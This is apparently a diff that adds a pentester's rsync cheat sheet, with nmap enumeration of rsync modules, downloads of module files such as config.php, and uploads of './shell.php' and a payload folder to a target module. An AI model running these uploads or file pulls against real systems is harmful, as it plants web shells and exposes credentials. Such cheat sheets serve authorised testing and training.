@@ -1,0 +1,44 @@
+==============================
+rsync (Remote Sync Service)
+Cheat Sheet – Professional
+==============================
+
+PORT:
+873/TCP – rsync daemon
+22/TCP  – rsync over SSH
+
+Transport:
+TCP
+
+Purpose:
+File synchronization (local / remote)
+Backup & mirroring service
+
+--------------------------------
+1. BASIC ENUMERATION
+--------------------------------
+
+nmap -p873 -sV <IP>
+nmap -p873 --script rsync-list-modules <IP>
+
+rsync rsync://user@<IP>/<module>/
+rsync rsync://<IP>/
+rsync rsync://<IP>/<module>/
+rsync -av rsync://<IP>/<module>/
+rsync -av rsync://<IP>/<module>/ ./<local_dir>/
+rsync rsync://<IP>/<module>/config.php .
+rsync ./shell.php rsync://<IP>/<module>/
+rsync -av ./payload/ rsync://<IP>/<module>/
+
+rsync -av -e ssh user@<IP>:/path/ ./local/
+rsync -av ./local/ user@<IP>:/path/
+
+/etc/rsyncd.conf
+/var/log/rsync.log
+/var/log/syslog
+
+rsync
+nmap
+netcat
+ssh
+
